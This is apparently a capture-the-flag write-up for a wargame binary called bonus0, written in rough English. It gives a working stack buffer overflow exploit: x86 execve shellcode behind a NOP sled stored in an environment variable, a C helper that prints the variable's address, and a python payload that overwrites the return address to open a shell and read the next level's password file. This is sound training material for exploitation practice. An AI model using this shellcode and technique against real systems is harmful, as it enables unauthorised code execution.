At first creating array of char with 54 cells
for variable acStack58.

And calling pp function
In pp creating two arrays with 20 cells and sending to func p this two arrays.

There is creating new constant array of 4104.
And printing ' - ' symbols via msg.

Here is next function:
* strncpy()
* strchr()
* strcpy()
* strlen()
* strcat()
* gets()
We should to find offset at this functions.
After first input of function we see second ' - '
and writing second argument more than this of array




We see offset of second string which calling segfault.
At this functions we are checking what system functions call:
info functioins <-write in gdb.
There are not malloc. So we try to call script to break it from env constant which we used in level2
which using offset of gets()
Threfore we put our shell code to env

- export SHELLCODE=$(python -c "print '\x90'*90 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

'\x90' - is the NOP - it's like argument which do not nothing instead other alphabetical letters.
We using NOP than to fill stack and after it to start our shellcode.
We write him 90 times and + our script than to start him.

1. Fill first read() which read from fd Zero 4096 bytes - 'A'*4095 
2. Fill second string of strncpy() which 20 bytes - 'B' * 9
When we enter data to two string of input
3. Filling stack with NOP - '\x90'*64
4. Launching our shellcode '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
5. + fill next 20 bytes with symbols for strncpy.


Because we have not memmory to perform our shellcode, we are put it to env variables.
export SHELLCODE=$(python -c "print '\x90'*90+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
And after it we should know address of SHELLCODE via C code

In /tmp/ creating C code:

#include <stdio.h>
#include <stdlib.h>

int	main(void)
{
	printf("%p\n", getenv("SHELLCODE"));
	return 0;
}
Compile it:
gcc getenv.c -o getaddress
./getaddress
0xbffff88a
And see address of SHELLCODE which we use for bonus0 binary.
And put this address to python script to perform.

python -c "print 'S'*4095 + '\n' + 'U'*9 + '\x8a\xf8\xff\xbf' + 'K'*50" > /tmp/text

In assembler this one mean that we just fill first buff of read function

For func read - 'S'*4095 + '\n'
First string we are filling with - 'U'*9
Address of SHELLCODE - '\x8a\xf8\xff\xbf'
And overfill function strncpy with 50 symbols.

Put this text to ./bonus0:
cat /tmp/text - | ./bonus0
cat /home/user/bonus1/.pass <--- than to find flag.